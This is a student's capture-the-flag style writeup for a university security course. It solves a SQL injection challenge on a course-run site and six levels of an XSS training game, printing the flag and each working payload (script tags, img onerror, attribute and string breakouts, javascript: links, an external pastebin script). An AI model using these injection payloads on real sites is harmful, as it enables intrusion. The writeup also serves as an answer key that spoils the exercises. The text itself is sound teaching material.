Writeup 10 - Crypto II
=====

Name: *Ben Eisner*
Section: *0201*

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement of honor pledge: *Ben Eisner*

## Assignment 10 Writeup

### Part 1 (70 Pts)

The first thing that I immediately noticed was the bolded **s**,**q**, and **l** letters in the words *Such a quick, little* in the Part 1 README. Since these letters spell out **sql**, this indicated that this part of the writeup involves something with SQL.

I started by navigating to the provided webpage `http://cornerstoneairlines.co:8080/` and clicking the various links to get a feel for the site. After navigating to the three listed items (*One-Way ticket to any destination*, *Cybersecurity Training Seminar*, *Old wifi router*), I noticed that there was a pattern in the URL.

| Item                              | URL                                          |
|-----------------------------------|----------------------------------------------|
| One-Way ticket to any destination | http://cornerstoneairlines.co:8080/item?id=0 |
| Cybersecurity Training Seminar    | http://cornerstoneairlines.co:8080/item?id=1 |
| Old wifi router                   | http://cornerstoneairlines.co:8080/item?id=2 |

From these links, it's clear that `/?id=#` is used to select different products in the database. I first tried to navigate to additional id's by trying `.../item?id=3`and `.../item?id=4` but I didn't see any flags. After this, I thought it would be a good idea to try some SQL injection to hopefully get a flag.

Fortunately, this writeup came at a convenient time since I had just finished a web security project for another Computer Science course at UMD (CMSC330) that used a lot of SQL.

Based on the info from the slides from the two classes, I thought I should try using SQL injection to 'hack' my way to finding a flag. I tried navigating to the URL with an id equal to `' or '1'='1`.

This webpage took me to a webpage that contained the flag `CMSC38R-{y0U-are_the_5ql_n1nja}`



### Part 2 (30 Pts)


#### Level 1: Hello, world of XSS
This level indicated that there is some vulnerability related to not escaping properly and that you are tasked with making the webpage popup a javascript alert. Since it's only the first level, I figured that all that would be involved is typing in some javascript code in the '*Enter query Here...*' box and pressing search. I typed `<script> alert("Hello"); </script>`, clicked search, then saw a 'Hello' popup that said I can advance to Level 2.  

#### Level 2: Persistence is key

Similar to level 1, this level also wanted you to create a script to pop up a javascript alert. The first thing I tried was the same script I used for Level 1 (`<script> alert("Hello"); </script>`), but that didn't work. I then revealed a hint and saw *This level is sponsored by the letters i, m and g and the attribute onerror*. I googled img onerror and saw that that `onerror = ""`can be used inside an image tag and is called if the image fails to load. I then inputted `<img src="test.png" onerror="alert()"/>`, saw the popup, and was told I can go on to level 3.

#### Level 3: That sinking feeling...

Just like the previous levels, this level also wanted you to execute an attack that results in a javascript popup appearing. One thing that was said in the description is that this level will require you to play around with the url in order to get the alert. I began by copying the code from level 1 and putting it at the end of the url, but that didn't work.

I then decided to look at the source code to better understand how the webpage works. One line that did stick out was `html += "<img src='/static/level3/cloud" + num + ".jpg' />";` since level 2's task was to hack the `<img>` tag. I also noticed that the num variable wasn't satanized at all. So, I added `'onerror='alert()';` to the end of the URL. This resulted in the final URL `https://xss-game.appspot.com/level3/frame#2'onerror='alert()';`. Navigating to this URL showed the javascript popup and let me advance to the next level.

#### Level 4: Context matters

The first thing I did with this level was click the start time button. I noticed that as soon as I pressed the button, the url changed to `https://xss-game.appspot.com/level4/frame?timer=3`. It immediately seemed like I had to do something with the `timer=` part of the URL. I decided to just enter `<script> alert("Hello"); </script>` after the = and see what happens. Unfortunately, it didn't work.

Next, I thought to look at the hints, which told me to try entering just a '. I tried this, but got `SyntaxError: Unexpected EOF` in the console. I then tried entering a ; instead since that's typically used to indicate the end of a line but didn't get anything either.

I then looked at the source code and noticed that the line ` <img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />` is what is executing the timer. I needed to find a way to throw in an alert();. I thought to try `3');alert('` which would start the timer, then process the alert. This ended up working since it popped up an alert and told me I could go on to the next level.

#### Level 5: Breaking protocol

The first thing I noticed with level was the URL, specifically `signup?next=confirm`. I looked at the source code and saw that if the form is successfully entered, the `<a href="{{ next }}">Next >></a>`is executed. It would normally take you to the confirm since next=confirm in the normal url, so I tried changing it to `next=alert()` but that didn't work. I then thought it would be a good idea to Google 'add javascript to a href'. I found a page that showed you can use javascript: to execute js code. So, I tried out this URL `https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert();`, saw the popup and was able to go to the next level.

#### Level 6: Follow the 🐇

For this final level, we had to find a way to make the application request an external file which will cause it to execute an alert().

I began by making a js file on pastebin. All that's on the pastebin is `alert()` which should hopefully be enough for this final part. I removed `/static/gadget.js` from the URL since that's the location of the gadget and replaced it with `pastebin.com/raw/1tt7Rmew` since that's the location of the external file.

Unfortunately, this didn't work so I decided to look at the source. I saw that there's a bit on regex checking so I added a // to the from of `pastebin.com/raw/1tt7Rmew` to result in the url: `https://xss-game.appspot.com/level6/frame#//pastebin.com/raw/1tt7Rmew`. This ended up working!
